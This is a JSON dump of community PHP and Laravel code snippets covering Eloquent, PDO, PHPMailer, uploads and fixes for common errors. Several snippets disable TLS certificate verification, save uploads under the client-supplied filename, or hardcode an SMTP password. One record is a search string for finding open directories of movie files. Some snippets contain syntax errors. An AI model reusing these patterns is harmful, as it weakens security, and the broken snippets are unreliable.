    "title": " Laravel eloquent update",
    "description": "# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n    /**      * The attributes that are mass assignable.      */     protected $fillable = [       \t\t\t\t\t   'title',                            'slug',                            'body',                            'image',                            'published',                            'comments_open'                           ];\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n/** in migrations this changes need to     add for table we want to add soft delete (LARAVEL)*/  \t/** The migrations. START */ \tpublic function up() \t{ \t\tSchema::table('users', function(Blueprint $table) \t\t{ \t\t\t$table->softDeletes(); \t\t}); \t} \t/** The migrations. END */  \t/** after adding softdelete you need to     point that column in table related model (LARAVEL)*/  \t/** The Model. START */   \tuse Illuminate\\Database\\Eloquent\\SoftDeletes;   \tclass User extends Model { \t  use SoftDeletes; \t  protected $dates = ['deleted_at']; \t} \t/** The Model. END */\nDB::table('users')             ->where('id', 1)             ->update(['votes' => 1]);\nuse App\\Models\\Flight;  $flight = Flight::find(1);  $flight->name = 'Paris to London';  $flight->save();\n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 204,
    "keyword": null,
    "link": null,
    "title": " Laravel foreach loop index in controller",
    "description": "@foreach ($items as  $item) {{ $loop->index }} @endforeach\n@foreach ($teams as $key => $team) {{ str_ordinal($key + 1) }} @endforeach \n//If you are working with a collection you can do something like this: foreach($collection as $item) {     if($collection->last() == $item) {         // last iteration     } }  //If you are working with an array (it also works with collections) you can do this: foreach($array as $item) {     if(end($array) == $item) {         // last iteration     } }\n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 205,
    "keyword": null,
    "link": null,
    "title": " Laravel get only the Ids of an eloquent arrays",
    "description": "$post_ids = Post::pluck('id')->toArray();\n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 206,
    "keyword": null,
    "link": null,
    "title": " Laravel inRandomOrder",
    "description": "$randomUser = DB::table('users')                 ->inRandomOrder()                 ->first();\n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 207,
    "keyword": null,
    "link": null,
    "title": " Laravel json response",
    "description": "return response()->json(['name' => 'Abigail', 'state' => 'CA']);\nreturn response()->json([     'name' => 'Abigail',     'state' => 'CA', ]);\nreturn Response::json([     'hello' => $value ], 201); // Status code here\nreturn response()->json($array);\npublic function getOrgById(Request $request){     // do something here...     return response()->json(array('foo' => 'bar')); } \n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 208,
    "keyword": null,
    "link": null,
    "title": " Laravel migrate fresh and seed",
    "description": "php artisan migrate:refresh --seed\n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 209,
    "keyword": null,
    "link": null,
    "title": " Laravel required if it meet some value from another field",
    "description": "//Laravel required if it meet some value from another field            'booking_type' => [                 'integer',                 'required',             ],             'booking_flight_description' => [               'required_if:booking_type,==,1' // you can use multi value by using ,             ], \n'last_name' => 'required_if:another_field,value'\n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 210,
    "keyword": null,
    "link": null,
    "title": " Laravel store multiple files",
    "description": "    public function fileUpload(Request $request)     {         if ($request->hasfile('filenames')) {             foreach ($request->file('filenames') as $file) {                 $name = $file->getClientOriginalName();                 $file->move(public_path() . '/mytestfile/', $name);                 $data[] = $name;             }             return back()->with('Success!','Data Added!');         }     } \n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 211,
    "keyword": null,
    "link": null,
    "title": " Laravel throttle",
    "description": "//Controller add  public function __construct() \t{ \t\t$this->middleware([ \t\t\t'auth', //About 20 requests per minute to Cotroller and error if there are too many requests \t\t\t'throttle:20,1'         ]); \t}\n//In Laravel we use throttle middleware to restrict the amount of traffic  //for a given route or group of routes. The throttle middleware accepts two parameters  //that determine the maximum number of requests that can be made in a given number of minutes.  //For example:  //Here 60 is number of requests you can make in 1 minute.    Route::middleware('throttle:60,1')->get('/user', function () {    // }); \nphp artisan make:middleware NameOfTheMiddleware\n<?php  namespace App\\Http\\Middleware;  use Closure;  class CheckAge {     /**      * Handle an incoming request.      *      * @param  \\Illuminate\\Http\\Request  $request      * @param  \\Closure  $next      * @return mixed      */     public function handle($request, Closure $next)     {         if ($request->age <= 200) {             return redirect('home');         }          return $next($request);     } }\n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 212,
    "keyword": null,
    "link": null,
    "title": " Last recode of DB using laravel",
    "description": "Model::latest()->first();\nreturn DB::table('files')->order_by('upload_time', 'desc')->first();\n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 213,
    "keyword": null,
    "link": null,
    "title": " Library not loaded: /usr/local/opt/icu4c/lib/libicuio.64.dylib Referenced from: /usr/local/bin/php",
    "description": "brew uninstall --ignore-dependencies node icu4c brew install node \n> which node /usr/local/bin/node > rm /usr/local/bin/node > brew unlink node > brew link --overwrite node\n",
    "reg_date": "2021-10-12T10:12:22.000Z"
  },
  {
    "id": 214,
    "keyword": null,
    "link": null,
    "title": " Limit Product Name in Magento2",
    "description": "<?php $productName = $_helper->productAttribute($_product, $_product->getName(), 'name'); $len = strlen($productName); ?> <a class=\"product-item-link\" href=\"<?php echo /* @escapeNotVerified */ $_product->getProductUrl() ?>\">     <?php echo substr($productName,0,50); ?>     <?php if($len > 50) echo '...'; ?> </a> \n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 215,
    "keyword": null,
    "link": null,
    "title": " Line : 83 -- syntax error, unexpected end of file php",
    "description": "The \"unexpected end of file\" error usually means you have a php block unterminated. The parser reads off the end of the file searching for block termination, usually } . In your case, the } right before your second <? php is the culprit.\n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 216,
    "keyword": null,
    "link": null,
    "title": " List of php frameworks",
    "description": "There are many PHP-frameworks to support web development and some popular PHP frameworks are 1. Laravel 2. CodeIgniter 3. Symfony 4. Zend 5. Phalcon 6. CakePHP 7. Yii 8. FuelPHP    Below are some other frameworks for php &bull;\tAura &bull;\tPHPixie &bull;\tKohana &bull;\tSlim &bull;\tFlight &bull;\tMedoo &bull;\tPOP PHP &bull;\tSimple MVC &bull;\tNette &bull;\tFat-free &bull;\tPHP Mini &bull;\tZikula &bull;\tSilex &bull;\tAgavi &bull;\tTypo 3 Flow &bull;\tPrado &bull;\tCappuccino &bull;\tLimonade &bull;\tWebasyst &bull;\tGuzzle PHP &bull;\tYAF &bull;\tAkelos PHP framework &bull;\tQcodo &bull;\tevoCore &bull;\tStratus &bull;\tSeagull &bull;\tMaintainable &bull;\tLimb &bull;\tPhocoa &bull;\tAjaxAC &bull;\tZoop  &bull;\tBlueShoes &bull;\tRecess &bull;\tPHPDevShell \n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 217,
    "keyword": null,
    "link": null,
    "title": " Log Laravel",
    "description": "use Illuminate\\Support\\Facades\\Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nuse Illuminate\\Support\\Facades\\Log;  Log::info(json_encode($user);\nuse Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nLog::info('This is some useful information.');  Log::warning('Something could be going wrong.');  Log::error('Something is really going wrong.');\nuse Monolog\\Logger;  $orderLog = new Logger('order'); $orderLog->pushHandler(new StreamHandler(storage_path('logs/mylogs.log')), Logger::INFO); $orderLog->info(\"Order id: ${orderId}\");\nuse Illuminate\\Support\\Facades\\Log;  // Severity levels base on RFC5424 commented on the right side Log::emergency($message);\t// system is unusable Log::alert($message);\t\t// action must be taken immediately Log::critical($message);\t// critical conditions Log::error($message);\t\t// error conditions Log::warning($message);\t\t// warning conditions Log::notice($message);\t\t// normal but significant condition Log::info($message);\t\t// informational messages Log::debug($message);\t\t// debug-level messages  // Checkout RFC5424 here - https://tools.ietf.org/html/rfc5424\n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 218,
    "keyword": null,
    "link": null,
    "title": " Making visible or hidden attributes from Eloquent temporarily",
    "description": "$users = $users->makeVisible(['address', 'phone_number']); $users = $users->makeHidden(['address', 'phone_number']);\n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 219,
    "keyword": null,
    "link": null,
    "title": " Message could not be sent.Mailer Error: SMTP connect() failed. https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting",
    "description": "i solve it by adding this line of code:  $mail->SMTPOptions = array( 'ssl' => array( 'verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true ) );  im using ssl 465..  and its really important to do this on your gmail account. basically turned it on. \"Access for less secure apps has been turned on\"\n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 220,
    "keyword": null,
    "link": null,
    "title": " Method Illuminate\\Database\\Eloquent\\Collection::save does not exist.",
    "description": "Remove Model class from the function parameter..  public function update(Request $request, *remove this class name* $id){ }\n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 221,
    "keyword": null,
    "link": null,
    "title": " Movie Name -inurl:(htm|html|php|pls|txt) intitle:index.of “last modified” (mp4|wma|aac|avi)",
    "description": "Movie Name\nraid bollywood movie \nBlack Panther-inurl:(htm|html|php|pls|txt) intitle:index.of &ldquo;last modified&rdquo;\norange is the new black\nMovie Name -inurl:(htm|html|php|pls|txt) intitle:index.of &ldquo;last modified&rdquo; (mp4|wma|aac|avi)\nkimetsu yaiba -inurl:(htm|html|php|pls|txt) intitle:index.of &ldquo;last modified&rdquo; (mp4|wma|aac|avi)\nendgame\n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 222,
    "keyword": null,
    "link": null,
    "title": " None of the supported PHP extensions (PgSQL, PDO PgSQL) are available.",
    "description": "sudo apt-get install php-pgsql \n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 223,
    "keyword": null,
    "link": null,
    "title": " Notice: Trying to access array offset on value of type int in /var/www/pdam/modules/phpexcel/PHPExcel/Cell/DefaultValueBinder.php on line 82",
    "description": "/* \tIf you are having this issue with Opencart's export / import extension:          Trying to access array offset on value of type int in ../../../system/library/export_import/Classes/PHPExcel/Cell/DefaultValueBinder.php on line 82          Then you need to open the file (DefaultValueBinder.php) and replace line 82 as follows: */  // OLD Line: // } elseif ($pValue[0] === '=' && strlen($pValue) > 1) { // NEW Line: } elseif (0 === strpos($pValue, '=') && strlen($pValue) > 1) {    // That's it... Happy coding, my homies <3\n# go to Classes/Cell/DefaultValueBinder.php # and replace line 82 } elseif (0 === strpos($pValue, '=') && strlen($pValue) > 1) {\n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 224,
    "keyword": null,
    "link": null,
    "title": " PDOException::(\"SQLSTATE[42000]: Syntax error or access violation: 1071 Specified key was too long; max key length is 1000 bytes\")  laravel 8",
    "description": "// Update your /app/Providers/AppServiceProvider.php to contain:  use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  //ON this error  //   PDOException::(\"SQLSTATE[42S01]: Base table or view already exists: 1050 Table 'users' already exists\") // After run ->  php artisan migrate:fresh  <- ! Note this will reset all tables in db\n",
    "reg_date": "2021-10-12T10:12:23.000Z"
  },
  {
    "id": 225,
    "keyword": null,
    "link": null,
    "title": " PDOException::(\"could not find driver\") windows",
    "description": "apt-get install php-mysql\nextension=php_pdo_mysql.dll\n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 226,
    "keyword": null,
    "link": null,
    "title": " PDO connect",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n$host     = \"localhost\";//Ip of database, in this case my host machine     $user     = \"root\";\t//Username to use $pass     = \"qwerty\";//Password for that user $dbname   = \"DB\";//Name of the database  try {     $connection = new PDO(\"mysql:host=$host;dbname=$dbname\", $user, $pass);     $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  }catch(PDOException $e) {   echo $e->getMessage();                          }\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {   $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);   // set the PDO error mode to exception   $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);   echo \"Connected successfully\"; } catch(PDOException $e) {   echo \"Connection failed: \" . $e->getMessage(); } ?>\npublic static function connexionBDD()     {         $base = null;          try {             $base = new PDO('mysql:host=' . MYSQL_HOSTNAME . '; dbname=' . MYSQL_DATABASE . '', MYSQL_USERNAME, MYSQL_PASSWORD);         } catch (exception $e) {             die('Erreur ' . $e->getMessage());         }          return $base;     }\n<?php $db = new PDO('mysql:host=myhost;dbname=mydb', 'login', 'password');   \n<?php     \t$pdo = new PDO('mysql:host=localhost;   \t\t\t\tdbname=the_name_of_your_databe,   \t\t\t\t'username',                  'password''); # by default your username is root  # if you don't have a password don't fill in it  #(optional) :  \t$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); \t$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);  ?>\n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 227,
    "keyword": null,
    "link": null,
    "title": " PHPMailer",
    "description": "<?php $to = $_POST['email']; $subject = \"Email Subject\";  $message = 'Dear '.$_POST['name'].',<br>'; $message .= \"We welcome you to be part of family<br><br>\"; $message .= \"Regards,<br>\";  // Always set content-type when sending HTML email $headers = \"MIME-Version: 1.0\" . \"\\r\\n\"; $headers .= \"Content-type:text/html;charset=UTF-8\" . \"\\r\\n\";  // More headers $headers .= 'From: <enquiry@example.com>' . \"\\r\\n\"; $headers .= 'Cc: myboss@example.com' . \"\\r\\n\";  mail($to,$subject,$message,$headers); ?>\n<?php require 'PHPMailerAutoload.php';  $mail = new PHPMailer;  //$mail->SMTPDebug = 3;                               // Enable verbose debug output  $mail->isSMTP();                                      // Set mailer to use SMTP $mail->Host = 'smtp1.example.com;smtp2.example.com';  // Specify main and backup SMTP servers $mail->SMTPAuth = true;                               // Enable SMTP authentication $mail->Username = 'user@example.com';                 // SMTP username $mail->Password = 'secret';                           // SMTP password $mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted $mail->Port = 587;                                    // TCP port to connect to  $mail->setFrom('from@example.com', 'Mailer'); $mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient $mail->addAddress('ellen@example.com');               // Name is optional $mail->addReplyTo('info@example.com', 'Information'); $mail->addCC('cc@example.com'); $mail->addBCC('bcc@example.com');  $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name $mail->isHTML(true);                                  // Set email format to HTML  $mail->Subject = 'Here is the subject'; $mail->Body    = 'This is the HTML message body <b>in bold!</b>'; $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';  if(!$mail->send()) {     echo 'Message could not be sent.';     echo 'Mailer Error: ' . $mail->ErrorInfo; } else {     echo 'Message has been sent'; }\n<?php  require_once('class.phpmailer.php');  $mailer = new PHPMailer(); $mailer->IsSMTP(); $mailer->SMTPDebug = 1; $mailer->Port = 587; //Indica a porta de conex&atilde;o  $mailer->Host = 'smtplw.com.br';//Endere&ccedil;o do Host do SMTP  $mailer->SMTPAuth = true; //define se haver&aacute; ou n&atilde;o autentica&ccedil;&atilde;o  $mailer->Username = 'smtplocaweb'; //Login de autentica&ccedil;&atilde;o do SMTP $mailer->Password = 'Gwb9etA323'; //Senha de autentica&ccedil;&atilde;o do SMTP $mailer->FromName = 'Bart S. Locaweb'; //Nome que ser&aacute; exibido $mailer->From = 'remetente@email.com.br'; //Obrigat&oacute;rio ser  a mesma caixa postal configurada no remetente do SMTP $mailer->AddAddress('destinatario@email.com','Nome do  destinat&aacute;rio'); //Destinat&aacute;rios $mailer->Subject = 'Teste enviado atrav&eacute;s do PHP Mailer  SMTPLW'; $mailer->Body = 'Este &eacute; um teste realizado com o PHP Mailer  SMTPLW'; if(!$mailer->Send()) { echo \"Message was not sent\"; echo \"Mailer Error: \" . $mailer->ErrorInfo; exit; } print \"E-mail enviado!\" ?>  \n<?php // Import PHPMailer classes into the global namespace // These must be at the top of your script, not inside a function use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception;  // Load Composer's autoloader require 'vendor/autoload.php';  // Instantiation and passing `true` enables exceptions $mail = new PHPMailer(true);  try {     //Server settings     $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output     $mail->isSMTP();                                            // Send using SMTP     $mail->Host       = 'smtp1.example.com';                    // Set the SMTP server to send through     $mail->SMTPAuth   = true;                                   // Enable SMTP authentication     $mail->Username   = 'user@example.com';                     // SMTP username     $mail->Password   = 'secret';                               // SMTP password     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged     $mail->Port       = 587;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above      //Recipients     $mail->setFrom('from@example.com', 'Mailer');     $mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient     $mail->addAddress('ellen@example.com');               // Name is optional     $mail->addReplyTo('info@example.com', 'Information');     $mail->addCC('cc@example.com');     $mail->addBCC('bcc@example.com');      // Attachments     $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments     $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name      // Content     $mail->isHTML(true);                                  // Set email format to HTML     $mail->Subject = 'Here is the subject';     $mail->Body    = 'This is the HTML message body <b>in bold!</b>';     $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';      $mail->send();     echo 'Message has been sent'; } catch (Exception $e) {     echo \"Message could not be sent. Mailer Error: {$mail->ErrorInfo}\"; }\n$mail->SMTPOptions = array(         'ssl' => array(             'verify_peer' => false,             'verify_peer_name' => false,             'allow_self_signed' => true         )     );\n$query = $this->con->prepare('SELECT *); \n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 228,
    "keyword": null,
    "link": null,
    "title": " PHP (WordPress) - Increase Maximum Upload File Size",
    "description": "// Increase Maximum Upload File Size @ini_set( 'upload_max_filesize' , '128M' ); //set this to a value > than your backup @ini_set( 'post_max_size', '128M'); //set this to a value > than your backup @ini_set( 'memory_limit', '256M' ); //set this to a value > than your backup @ini_set( 'max_execution_time', '300' ); //set this to 0 (infinite) @ini_set( 'max_input_time', '300' );\n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 229,
    "keyword": null,
    "link": null,
    "title": " PHP Date add days",
    "description": "<?php  // PHP program to add days to $Date     // Declare a date  $date = \"2019-05-10\";     // Add days to date and display it  echo date('Y-m-d', strtotime($date. ' + 10 days'));     ?> \n$date = \"Mar 03, 2011\"; $date = strtotime($date); $date = strtotime(\"+7 day\", $date); echo date('M d, Y', $date);\n<?php   // adding extra days to date       // Steps: \t// 1) using carbon     // 2) using strtotime            //Step 1   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      $new_date = Carbon::parse($date->addDays(1); // adds extra day                                // Step 2   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      echo $new_date = date('Y M d h:i:s', strtotime($date. '+1 day')); ?>\n$start_date = \"2015/03/02\";   $date = strtotime($start_date); $date = strtotime(\"+7 day\", $date); echo date('Y/m/d', $date); \n$date = new DateTime('2020-11-24'); $date->add(new DateInterval(\"P9D\"));  echo $date->format('Y-m-d');\n$date = date('Y-m-d', strtotime(\"+1 day\")); \n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 230,
    "keyword": null,
    "link": null,
    "title": " PHP Deprecated: Function create function()",
    "description": "//From create_function( '$caps', \"return '$caps';\" );  //To function($caps) {return $caps;}\n//change create_function to anonymous like so: //change: $square = create_function('$x', 'return pow($x,2);'); //to: $square = function($x){ \treturn pow($x,2); };\n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 231,
    "keyword": null,
    "link": null,
    "title": " PHP Deprecated:  Methods with the same name as their class will not be constructors in a future version of PHP;",
    "description": "//From public function TSStatus($host, $queryPort);  //to public function __construct($host, $queryPort);\n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 232,
    "keyword": null,
    "link": null,
    "title": " PHP Fatal error: Allowed memory size of 134217728 bytes exhausted",
    "description": "export COMPOSER_MEMORY_LIMIT=-1\nini_set('memory_limit', '-1'); \nphp -d memory_limit=-1 composer.phar require hwi/oauth-bundle php-http/guzzle6-adapter php-http/httplug-bundle \nphp -d memory_limit=-1 /usr/local/bin/composer install  \nFatal error: Allowed memory size of 1610612736 bytes exhausted  export COMPOSER_MEMORY_LIMIT=-1 and restart composer update \nmemory_limit = 64M;\n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 233,
    "keyword": null,
    "link": null,
    "title": " PHP Fatal error: Allowed memory size of 1610612736 bytes exhausted",
    "description": "export COMPOSER_MEMORY_LIMIT=-1\nphp -d memory_limit=-1 composer.phar require hwi/oauth-bundle php-http/guzzle6-adapter php-http/httplug-bundle \nphp --ini  nano /etc/php5/cli/php.ini (it could be different for you)  Search for memory_limit by (ctrl + w)    make memory_limit to -1 or 2G (depending on what you can increase to)    save by (ctrl + x) then enter \nFatal error: Allowed memory size of 1610612736 bytes exhausted  export COMPOSER_MEMORY_LIMIT=-1 and restart composer update \n1. Firstly i find which php.ini is working because i was using multiple xampp,   so using : php --ini 2. after that in that file i updated the memory_limit = -1    \n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 234,
    "keyword": null,
    "link": null,
    "title": " PHP Fatal error: Uncaught Error: Call to undefined function mcrypt encrypt()",
    "description": ";extension=php_mcrypt.dll to extension=php_mcrypt.dll\n",
    "reg_date": "2021-10-12T10:12:24.000Z"
  },
  {
    "id": 235,
    "keyword": null,
    "link": null,
    "title": " PHP Fatal error:  Allowed memory size of 1610612736 bytes exhausted (tried to allocate 4096 bytes)",
    "description": "export COMPOSER_MEMORY_LIMIT=-1\nset COMPOSER_MEMORY_LIMIT=-1 \nphp -d memory_limit=-1 composer.phar require hwi/oauth-bundle php-http/guzzle6-adapter php-http/httplug-bundle \nphp -d memory_limit=-1 /usr/local/bin/composer install  \n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 236,
    "keyword": null,
    "link": null,
    "title": " PHP File Open/Read/Close",
    "description": "$myfile= fopen(\"welcom.txt\",\"w\"); echo fwrite($myfile, filesize(\"welcom.txt\")); fclose($myfile);\nrequire_once \"php2/include.php\"; echo $varriable;\n<?php     $myfile = fopen (\"webdictionary.txt\" , \"r\") or die (\"Unable to open file!\");     echo fread (\"$myfile\", filesize (\"webdictionary.txt\"));     fclose ($myfile);\n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 237,
    "keyword": null,
    "link": null,
    "title": " PHP Move File from One Folder to Another",
    "description": "//Use the rename() function. rename('first_location/image1.jpg', 'new_location/image1.jpg');\n<?php  /* Store the path of source file */$filePath = 'images/test.jpeg';  /* Store the path of destination file */$destinationFilePath = 'copyImages/test.jpeg';  /* Move File from images to copyImages folder */if( !rename($filePath, $destinationFilePath) ) {      echo \"File can't be moved!\";  }  else {      echo \"File has been moved!\";  }   ?>\n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 238,
    "keyword": null,
    "link": null,
    "title": " PHP Numbers",
    "description": "$num = \"3.14\"; $int = (int)$num;\n<?php $x = 5985; var_dump(is_int($x));  $x = 59.85; var_dump(is_int($x)); ?>\n// ? means $count can be NULL or integer, maybe PHP >=7.4 private ?int $count\n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 239,
    "keyword": null,
    "link": null,
    "title": " PHP Startup: Unable to load dynamic library",
    "description": "apt-get update && apt-get upgrade\nIf you are a windows user, make sure to uncomment this line in your php.ini  file: \t extension_dir = \"ext\"\nIt means there is an extension=... or zend_extension=... line in one of your php configuration files (php.ini, or another close to it) that is trying to load that extension : ixed.5.2.lin  Unfortunately that file or path doesn't exist or the permissions are incorrect.  Try to search in the .ini files that are loaded by PHP (phpinfo() can indicate which ones are) - one of them should try to load that extension. Either correct the path to the file or comment out the corresponding line.\ncomment out this line by adding a semi-colon in front ;extension=apc.so \n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 240,
    "keyword": null,
    "link": null,
    "title": " PHP Startup: Unable to load dynamic library 'curl'",
    "description": "apt-get update && apt-get upgrade\n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 241,
    "keyword": null,
    "link": null,
    "title": " PHP Stream Functions",
    "description": "The Stream functions are part of the PHP core. There is no installation needed to use these functions.    set_socket_blocking()\tDeprecated in PHP 5.4, and removed in PHP 7.0. Alias of stream_set_blocking() stream_bucket_prepend()\t  stream_context_create()\t  stream_context_get_default()\t  stream_context_get_options()\t  stream_context_get_params()\t  stream_context_set_default()\t  stream_context_set_options()\t  stream_context_set_params()\t  stream_copy_to_stream()\tCopies data from one stream to another stream_filter_append()\tAppends a filter to a stream stream_filter_prepend()\t  stream_filter_register()\t  stream_filter_remove()\t  stream_get_contents()\t  stream_get_filters()\t  stream_get_line()\t  stream_get_meta_data()\t  stream_get_transports()\t  stream_get_wrappers()\t  stream_is_local()\t  stream_isatty()\t  stream_notification_callback()\t  stream_register_wrapper()\tAlias of stream_wrapper_register() stream_resolve_include_path()\t  stream_select()\t  stream_set_blocking()\t  stream_set_chunk_size()\t  stream_set_read_buffer()\t  stream_set_timeout()\t  stream_set_write_buffer()\t  stream_socket_accept()\t  stream_socket_client()\t  stream_socket_enable_crypto()\t  stream_socket_get_name()\t  stream_socket_pair()\t  stream_socket_recvfrom()\t  stream_socket_sendto()\t  stream_socket_server()\t  stream_socket_shutdown()\t  stream_supports_lock()\t  stream_wrapper_register()\t  stream_wrapper_restore()\t  stream_wrapper_unregister()\n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 242,
    "keyword": null,
    "link": null,
    "title": " PHP Time Limit:",
    "description": "set_time_limit(300);\n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 243,
    "keyword": null,
    "link": null,
    "title": " PHP Warning: PHP Startup: Unable to load dynamic library 'pdo mysql.so'",
    "description": "sudo apt-get --purge remove php-common  sudo apt-get install php-common php-mysql php-cli\n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 244,
    "keyword": null,
    "link": null,
    "title": " PHP Warning:  Version warning: Imagick was compiled against Image Magick version 1654 but version 1650 is loaded.",
    "description": "write the next line in your php.ini file  imagick.skip_version_check=true\n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 245,
    "keyword": null,
    "link": null,
    "title": " PHP Warning: file get contents(): SSL operation failed with code 1. OpenSSL Error messages:",
    "description": " $options=array(     \"ssl\"=>array(         \"verify_peer\"=>false,         \"verify_peer_name\"=>false,     ), );   $r = file_get_contents(\"https://yoursite.com/\", false, stream_context_create($options)); \n",
    "reg_date": "2021-10-12T10:12:25.000Z"
  },
  {
    "id": 246,
    "keyword": null,
    "link": null,
    "title": " PHP auto refresh page",
    "description": "<?php     $url1=$_SERVER['REQUEST_URI'];     header(\"Refresh: 5; URL=$url1\"); ?>\nheader(\"Refresh:0\");\n",
    "reg_date": "2021-10-12T10:12:26.000Z"
  },
  {
    "id": 247,
    "keyword": null,
    "link": null,
    "title": " PHP dynamic property name",
    "description": "$obj->{$field}\n",
    "reg_date": "2021-10-12T10:12:26.000Z"
  },
  {
    "id": 248,
    "keyword": null,
    "link": null,
    "title": " PHP extension ext-intl",
    "description": "composer install --ignore-platform-reqs \n",
    "reg_date": "2021-10-12T10:12:26.000Z"
  },
  {
    "id": 249,
    "keyword": null,
    "link": null,
    "title": " PHP extension simplexml",
    "description": "apt install php7.0-mbstring php7.0-zip php7.0-xml\n",
    "reg_date": "2021-10-12T10:12:26.000Z"
  },
  {
    "id": 250,
    "keyword": null,
    "link": null,
    "title": " PHP get url",
    "description": "$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\"; \n",
    "reg_date": "2021-10-12T10:12:26.000Z"
  },
  {
    "id": 251,
    "keyword": null,
    "link": null,
    "title": " PHP how to make a template",
